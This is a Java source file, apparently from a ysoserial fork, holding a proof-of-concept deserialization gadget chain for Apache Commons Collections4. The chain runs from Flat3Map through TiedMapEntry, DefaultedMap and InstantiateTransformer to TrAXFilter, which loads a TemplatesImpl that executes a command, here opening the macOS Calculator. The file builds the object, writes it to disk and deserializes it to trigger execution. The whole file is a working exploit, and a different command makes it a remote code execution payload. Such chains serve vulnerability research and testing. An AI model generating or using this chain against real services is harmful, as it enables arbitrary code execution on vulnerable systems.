package ysoserial.payloads.tabbyGadgetChains.CommonCollections4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;
import org.apache.commons.collections4.map.Flat3Map;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.ConcurrentSkipListMap;

/**
 * readObject:1106, Flat3Map (org.apache.commons.collections4.map)
 * put:359, Flat3Map (org.apache.commons.collections4.map)
 * hashCode:122, TiedMapEntry (org.apache.commons.collections4.keyvalue)
 * getValue:73, TiedMapEntry (org.apache.commons.collections4.keyvalue)
 * get:203, DefaultedMap (org.apache.commons.collections4.map)
 * transform:112, ChainedTransformer (org.apache.commons.collections4.functors)
 * transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)
 * transform:116, InstantiateTransformer (org.apache.commons.collections4.functors)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * <init>:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)
 */

public class CC4_Poc10 {
    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl("/Applications/Calculator.app/Contents/MacOS/Calculator");
        // inert chain for setup
        final org.apache.commons.collections4.Transformer transformerChain = new org.apache.commons.collections4.functors.ChainedTransformer(
                new org.apache.commons.collections4.Transformer[]{ new org.apache.commons.collections4.functors.ConstantTransformer(1) });
        // real chain for after setup
        final org.apache.commons.collections4.Transformer[] transformers = new org.apache.commons.collections4.Transformer[] {
                new org.apache.commons.collections4.functors.ConstantTransformer(TrAXFilter.class),
                new org.apache.commons.collections4.functors.InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { templates } )};
        HashMap innermap = new HashMap();
        Class clazz3 = Class.forName("org.apache.commons.collections4.map.DefaultedMap");
        Constructor ddefaultedMap = clazz3.getDeclaredConstructor(Map.class,Transformer.class);
        ddefaultedMap.setAccessible(true);
        Object outerMap = ddefaultedMap.newInstance(innermap,transformerChain);
        TiedMapEntry tiedmap = new TiedMapEntry((DefaultedMap) outerMap,123);
        Flat3Map flat3Map = new Flat3Map((DefaultedMap) outerMap);
        flat3Map.put(tiedmap,"1");
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        //         serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccv4"));
        outputStream.writeObject(flat3Map);
        outputStream.close();

        //         deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccv4"));
        inputStream.readObject();
    }
}
